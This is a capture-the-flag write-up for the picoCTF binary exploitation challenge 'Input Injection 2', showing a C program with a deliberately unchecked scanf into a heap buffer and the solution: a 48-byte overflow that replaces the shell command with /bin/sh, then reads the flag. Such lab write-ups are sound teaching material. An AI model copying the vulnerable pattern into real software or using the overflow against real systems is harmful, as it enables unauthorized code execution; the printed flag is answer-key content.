# Input Injection 2

> Category: Binary Exploitation

## Description

This program greets you and then runs a command. But can you take control of what command it executes?

<details>
<summary>Program source code</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
    char* username = malloc(28);
    char* shell = malloc(28);

    printf("username at %p\n", username);
    fflush(stdout);
    printf("shell at %p\n", shell);
    fflush(stdout);

    strcpy(shell, "/bin/pwd");

    printf("Enter username: ");
    fflush(stdout);
    scanf("%s", username);

    printf("Hello, %s. Your shell is %s.\n", username, shell);
    system(shell);
    fflush(stdout);

    return 0;
}
```
</details>

## Solution

When the program asks for our input, it doesn't check to ensure our input is within the 28-byte `username` buffer. This means that we can write outside of the buffer, and overwrite the `shell` buffer to execute whatever we want.

When we run the executable, it tells us the addresses of `username` and `shell`. First, we have to find the byte offset of these two buffers

```sh
$ nc amiable-citadel.picoctf.net 56157
username at 0x2d8e72a0
shell at 0x2d8e72d0
Enter username:
```

Let's use some Python to find the offset

```py
>>> hex(0x905e2d0-0x905e2a0)
'0x30'
>>> 'A'*0x30
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```

So inputting 48 A's puts us right at the start of the `shell` buffer. Now we just append the shell command we want to run (`/bin/sh` in this case)

```sh
Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
ls
flag.txt
cat flag.txt
picoCTF{us3rn4m3_2_sh3ll_6538c392}
```

### Flag

`picoCTF{us3rn4m3_2_sh3ll_6538c392}`
